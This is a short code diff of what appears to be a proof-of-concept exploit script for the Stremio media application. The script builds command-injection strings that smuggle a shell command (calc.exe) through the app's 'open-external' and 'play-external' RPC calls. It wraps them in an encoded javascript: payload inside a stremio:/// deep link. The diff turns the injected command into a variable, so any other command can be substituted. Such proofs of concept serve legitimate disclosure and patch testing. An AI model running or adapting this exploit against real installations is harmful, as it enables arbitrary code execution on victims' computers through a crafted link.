@@ -11,13 +11,15 @@ const vector = process.argv[2] || "external"
 // target override (argv[3]): unc = share URL
 const target = process.argv[3]
 
+const command = "calc.exe"
+
 let ARG, RPC, TOP_JS;
 if (vector == "external") {
-    ARG = 'https://web.stremio.com/" <. & calc.exe & rem ';
+    ARG = `https://web.stremio.com/" <. & ${command} & rem `;
     RPC = JSON.stringify({ id: 1, args: ['open-external', ARG] });
 }
 if (vector == "vlc" || vector == "potplayer") {
-    ARG = `${vector}://web.stremio.com/" <. & calc.exe & rem `;
+    ARG = `${vector}://web.stremio.com/" <. & ${command} & rem `;
     RPC = JSON.stringify({ id: 1, args: ['play-external', ARG] });
 }
 if (vector == "unc") {
@@ -41,5 +43,5 @@ const PAYLOAD = 'javascript:void' + encodeURIComponent(
 const encoded = encodeURIComponent(
     zlib.deflateSync(Buffer.from(JSON.stringify({ playerFrameUrl: PAYLOAD }), 'utf8')).toString('base64')
 );
-console.log(PAYLOAD)
+//console.log(PAYLOAD)
 console.log(`\nstremio:///player/${encoded}`);
